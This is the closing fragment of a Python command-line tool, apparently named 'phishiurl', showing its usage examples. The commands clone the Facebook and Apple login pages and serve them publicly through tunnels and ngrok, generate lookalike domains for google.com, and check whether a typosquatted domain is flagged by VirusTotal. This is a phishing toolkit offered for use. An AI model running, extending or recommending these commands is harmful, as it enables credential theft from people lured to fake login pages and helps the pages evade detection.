      phishiurl tunnel --port 8080 --template facebook_login.html
      phishiurl suggest --domain google.com --check-availability
      phishiurl api_check --url faceb00k.com --service virustotal
      phishiurl clone --url https://www.apple.com/login --port 8080 --use-ngrok
      phishiurl clone --url https://www.apple.com/login --port 8080 --use-ngrok --download-js --download-all
      phishiurl clone --local-folder ./my_website --port 8080
    """)

if __name__ == '__main__':
    cli()
